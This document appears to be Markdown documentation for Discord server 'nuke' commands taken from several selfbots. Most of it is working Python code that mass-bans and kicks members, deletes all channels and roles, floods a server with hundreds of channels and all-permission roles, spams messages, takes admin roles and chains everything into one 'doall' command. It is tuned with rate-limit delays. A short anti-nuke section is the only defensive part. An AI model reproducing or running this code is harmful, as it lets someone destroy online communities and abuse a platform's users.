# Nuke Commands Documentation

> ⚠️ **WARNING**: These commands are extremely destructive and will permanently damage servers. Use with extreme caution and only on servers you own or have explicit permission to test on.

---

## Table of Contents

1. [Overview](#overview)
2. [Server Destruction Commands](#server-destruction-commands)
3. [Member Destruction Commands](#member-destruction-commands)
4. [Channel Destruction Commands](#channel-destruction-commands)
5. [Role Destruction Commands](#role-destruction-commands)
6. [Spam Commands](#spam-commands)
7. [Mass Destruction Commands](#mass-destruction-commands)
8. [Anti-Nuke Protection](#anti-nuke-protection)
9. [Implementation Details](#implementation-details)

---

## Overview

Nuke commands are designed for complete server destruction. They leverage Discord API to rapidly delete content, ban members, and create chaos. All commands require appropriate permissions (Administrator, Manage Server, Ban Members, etc.).

### Rate Limiting Considerations

```python
# Recommended delays to avoid rate limits
BAN_DELAY = 1.5  # seconds between bans
KICK_DELAY = 1.0  # seconds between kicks
DELETE_DELAY = 0.5  # seconds between deletions
CREATE_DELAY = 0.3  # seconds between creations
```

---

## Server Destruction Commands

### `destroy` / `nuke` / `rekt`

**Source**: Alucard Selfbot, Exeter Selfbot

Complete server annihilation - the ultimate destruction command.

**Parameters**: None

**Effects**:
- Bans all members (except self)
- Deletes all channels
- Deletes all roles
- Renames server to random string
- Creates 250 text channels named "exeter" or random strings
- Creates 250 roles with random colors

**Implementation**:
```python
async def destroy(ctx):
    await ctx.message.delete()
    
    # Ban all members
    for member in list(ctx.guild.members):
        try:
            await member.ban(reason="Nuked")
        except:
            pass
    
    # Delete all channels
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    
    # Delete all roles
    for role in list(ctx.guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    # Rename server
    await ctx.guild.edit(name=RandString())
    
    # Create 250 channels
    for i in range(250):
        await ctx.guild.create_text_channel(name="nuked")
    
    # Create 250 roles
    for i in range(250):
        await ctx.guild.create_role(
            name=RandString(), 
            color=RandomColor(),
            permissions=discord.Permissions.all()
        )
```

---

### `servername` / `renameserver` / `nameserver`

**Source**: Exeter Selfbot

Renames the server.

**Parameters**:
- `name` (str): New server name

**Implementation**:
```python
async def servername(ctx, *, name: str):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
```

---

### `copy` / `clone`

**Source**: Alucard Selfbot

Creates a backup/cloned server with same structure.

**Parameters**: None

**Effects**:
- Creates new server named "backup-{original_name}"
- Copies all categories
- Recreates all channels in proper categories
- Attempts to copy server icon

**Implementation**:
```python
async def copy(ctx):
    await ctx.message.delete()
    new_guild = await ctx.bot.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    
    for category in ctx.guild.categories:
        new_category = await new_guild.create_category(category.name)
        for channel in category.channels:
            if isinstance(channel, discord.VoiceChannel):
                await new_category.create_voice_channel(channel.name)
            elif isinstance(channel, discord.TextChannel):
                await new_category.create_text_channel(channel.name)
```

---

## Member Destruction Commands

### `massban` / `banall` / `banwave`

**Source**: Alucard, Exeter, Karuma, Zero-Attacker

Bans all members from the server.

**Parameters**:
- `reason` (str, optional): Ban reason
- `delay` (float, optional): Delay between bans (default: 1.5s)

**Implementation**:
```python
async def massban(ctx, *, reason: str = "Nuked"):
    await ctx.message.delete()
    
    members = [m for m in ctx.guild.members 
               if m != ctx.bot.user and m.top_role < ctx.guild.me.top_role]
    
    for idx, member in enumerate(members, 1):
        try:
            await member.ban(reason=reason, delete_message_days=7)
            print(f"[{idx}/{len(members)}] Banned {member}")
        except Exception as e:
            print(f"Failed to ban {member}: {e}")
        
        await asyncio.sleep(1.5)  # Rate limit protection
```

---

### `masskick` / `kickall` / `kickwave`

**Source**: Alucard, Exeter, Zero-Attacker

Kicks all members from the server.

**Parameters**:
- `reason` (str, optional): Kick reason

**Implementation**:
```python
async def masskick(ctx, *, reason: str = "Kicked"):
    await ctx.message.delete()
    
    for member in list(ctx.guild.members):
        if member != ctx.bot.user:
            try:
                await member.kick(reason=reason)
            except:
                pass
            await asyncio.sleep(1.0)
```

---

### `massunban` / `unbanall` / `purgebans`

**Source**: Alucard, Exeter

Unbans all banned users.

**Parameters**: None

**Implementation**:
```python
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    
    for entry in banlist:
        try:
            await ctx.guild.unban(user=entry.user)
            await asyncio.sleep(2)
        except:
            pass
```

---

### `nickall` / `massnick`

**Source**: Exeter Selfbot

Changes all members' nicknames.

**Parameters**:
- `nickname` (str): Nickname to set (use "" for blank)

**Implementation**:
```python
async def nickall(ctx, *, nickname: str):
    await ctx.message.delete()
    
    for member in ctx.guild.members:
        if member != ctx.bot.user and member.top_role < ctx.guild.me.top_role:
            try:
                await member.edit(nick=nickname)
                await asyncio.sleep(0.5)
            except:
                pass
```

---

### `dynoban`

**Source**: Exeter Selfbot

Uses Dyno bot commands to ban members (bypasses some permissions).

**Parameters**: None

**Implementation**:
```python
async def dynoban(ctx):
    await ctx.message.delete()
    
    for member in ctx.guild.members:
        if member != ctx.bot.user:
            await ctx.send(f"?ban {member.mention}")
            await asyncio.sleep(1.5)
```

---

## Channel Destruction Commands

### `delchannels` / `delchannel` / `deletechannels`

**Source**: Alucard, Exeter, Zero-Attacker

Deletes all channels in the server.

**Parameters**: None

**Implementation**:
```python
async def delchannels(ctx):
    await ctx.message.delete()
    
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except:
            pass
```

---

### `spamchannels` / `masschannels` / `ctc`

**Source**: Alucard, Exeter

Creates mass text channels.

**Parameters**:
- `name` (str): Channel name prefix
- `count` (int): Number of channels (default: 250, max: 500)

**Implementation**:
```python
async def spamchannels(ctx, name: str = "nuked", count: int = 250):
    await ctx.message.delete()
    count = min(count, 500)
    
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i+1}")
            await asyncio.sleep(0.3)
        except:
            pass
```

---

### `renamechannels` / `rc`

**Source**: Exeter Selfbot

Renames all channels.

**Parameters**:
- `name` (str): New channel name

**Implementation**:
```python
async def renamechannels(ctx, *, name: str):
    await ctx.message.delete()
    
    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=name)
            await asyncio.sleep(0.5)
        except:
            pass
```

---

## Role Destruction Commands

### `delroles` / `deleteroles`

**Source**: Alucard, Exeter, Zero-Attacker

Deletes all roles.

**Parameters**: None

**Implementation**:
```python
async def delroles(ctx):
    await ctx.message.delete()
    
    for role in list(ctx.guild.roles):
        if role.name != "@everyone" and role.position < ctx.guild.me.top_role.position:
            try:
                await role.delete()
                await asyncio.sleep(0.5)
            except:
                pass
```

---

### `massrole` / `spamroles` / `massroles`

**Source**: Alucard, Exeter

Creates mass roles.

**Parameters**:
- `name` (str): Role name prefix
- `count` (int): Number of roles (default: 250)

**Implementation**:
```python
async def massrole(ctx, name: str = "nuked", count: int = 250):
    await ctx.message.delete()
    
    for i in range(count):
        try:
            await ctx.guild.create_role(
                name=f"{name}-{i+1}",
                color=discord.Color.random(),
                permissions=discord.Permissions.all()
            )
            await asyncio.sleep(0.3)
        except:
            pass
```

---

### `giveadmin` / `givemeadmin`

**Source**: Exeter Selfbot

Gives the user all admin roles.

**Parameters**: None

**Implementation**:
```python
async def giveadmin(ctx):
    await ctx.message.delete()
    
    for role in ctx.guild.roles:
        if role.permissions.administrator and role.position < ctx.guild.me.top_role.position:
            try:
                await ctx.author.add_roles(role)
            except:
                pass
```

---

## Spam Commands

### `spam` / `flood`

**Source**: Alucard, Exeter, selfbot.py, Zero-Attacker

Spams messages in current channel.

**Parameters**:
- `amount` (int): Number of messages
- `message` (str): Message content

**Implementation**:
```python
async def spam(ctx, amount: int, *, message: str):
    await ctx.message.delete()
    
    for _ in range(amount):
        await ctx.send(message)
        await asyncio.sleep(0.5)
```

---

### `spammass` / `spamallchannels`

**Source**: Zero-Attacker

Spams message across ALL text channels.

**Parameters**:
- `message` (str): Message to spam
- `times` (int): Number of iterations

**Implementation**:
```python
async def spammass(ctx, *, message: str):
    await ctx.message.delete()
    times = int(input("Times: "))
    
    for _ in range(times):
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(message)
                await asyncio.sleep(0.5)
            except:
                pass
```

---

### `rainbow` / `rainbow-role`

**Source**: Alucard Selfbot

Continuously changes role color.

**Parameters**:
- `role` (str): Role name

**Implementation**:
```python
async def rainbow(ctx, *, role: str):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    
    while True:
        try:
            await role.edit(color=discord.Color.random())
            await asyncio.sleep(10)
        except:
            break
```

---

## Mass Destruction Commands

### `doall` / `nukeall` / `totaldestruction`

**Source**: Zero-Attacker, Karuma

Executes ALL destruction commands in sequence.

**Execution Order**:
1. Ban all members
2. Kick all members
3. Delete all channels
4. Delete all roles
5. Delete all emojis
6. Delete all webhooks
7. Delete all invites
8. Spam channels

**Implementation**:
```python
async def doall(ctx):
    await ctx.message.delete()
    
    await massban(ctx)
    await masskick(ctx)
    await delchannels(ctx)
    await delroles(ctx)
    await deleteemojis(ctx)
    await deletewebhooks(ctx)
    await deleteinvites(ctx)
    await spamchannels(ctx, name="nuked", count=250)
```

---

### `wizz` / `fakehack`

**Source**: Exeter Selfbot

Fake "hacking" animation that simulates destruction.

**Parameters**: None

**Implementation**:
```python
async def wizz(ctx):
    await ctx.message.delete()
    
    stages = [
        "`WIZZING {ctx.guild.name}...`",
        "`DELETING {len(ctx.guild.roles)} ROLES...`",
        "`DELETING {len(ctx.guild.channels)} CHANNELS...`",
        "`BANNING {len(ctx.guild.members)} MEMBERS...`",
        "`@everyone {ctx.guild.name} HAS BEEN WIZZED`"
    ]
    
    msg = await ctx.send(stages[0])
    for stage in stages[1:]:
        await asyncio.sleep(1)
        await msg.edit(content=stage)
```

---

## Anti-Nuke Protection

### `antinuke` / `antiraid`

**Source**: Exeter Selfbot

Toggles anti-nuke protection.

**Parameters**:
- `state` (str): "on" / "off" / "true" / "false"

**How it works**:
- Monitors audit logs for ban/kick events
- Bans the user who performed mass bans/kicks
- Whitelist system for trusted users

**Implementation**:
```python
# Event listener
@bot.event
async def on_member_ban(guild, user):
    if not bot.antinuke_enabled:
        return
    
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        if entry.user.id not in bot.whitelisted_users:
            await entry.user.ban(reason="Anti-nuke: Mass banning detected")

@bot.command()
async def antinuke(ctx, state: str):
    await ctx.message.delete()
    bot.antinuke_enabled = state.lower() in ("on", "true", "enable")
```

---

### `whitelist` / `wl`

**Source**: Exeter Selfbot

Whitelist a user from anti-nuke detection.

**Parameters**:
- `user` (discord.Member): User to whitelist

---

## Implementation Details

### Helper Functions

```python
def RandomColor():
    """Generate random Discord color"""
    return discord.Color(random.randint(0x000000, 0xFFFFFF))

def RandString(length=10):
    """Generate random string"""
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))

async def safe_delete(channel):
    """Safely delete with error handling"""
    try:
        await channel.delete()
    except discord.Forbidden:
        pass
    except discord.HTTPException:
        pass
```

### Rate Limit Handler

```python
class RateLimitHandler:
    def __init__(self):
        self.delays = {
            'ban': 1.5,
            'kick': 1.0,
            'channel_delete': 0.5,
            'channel_create': 0.3,
            'role_delete': 0.5,
            'role_create': 0.3
        }
    
    async def execute_with_delay(self, action, *args, **kwargs):
        delay = self.delays.get(action, 1.0)
        await asyncio.sleep(delay)
        return await action(*args, **kwargs)
```

### Permission Checks

```python
def check_permissions(ctx, permission):
    """Check if bot has required permission"""
    return getattr(ctx.guild.me.guild_permissions, permission, False)

def check_role_hierarchy(ctx, member):
    """Check if bot's role is higher than target"""
    return ctx.guild.me.top_role.position > member.top_role.position
```

---

## Command Summary

| Command | Aliases | Category | Destruction Level |
|---------|---------|----------|-------------------|
| `destroy` | nuke, rekt | Total | ★★★★★ |
| `massban` | banall, banwave | Members | ★★★★☆ |
| `masskick` | kickall, kickwave | Members | ★★★★☆ |
| `delchannels` | delchannel | Channels | ★★★★☆ |
| `delroles` | deleteroles | Roles | ★★★☆☆ |
| `spamchannels` | masschannels | Channels | ★★★☆☆ |
| `massrole` | spamroles | Roles | ★★☆☆☆ |
| `doall` | nukeall | Total | ★★★★★ |
| `antinuke` | antiraid | Protection | - |

---

## References

- **Alucard Selfbot**: `Main.py` lines 1222-1300
- **Exeter Selfbot**: `exeter.py` destroy commands
- **Karuma**: `karuma.py` nuke_server function
- **Zero-Attacker**: `Zero-Tool/nuke-bot/main.js`
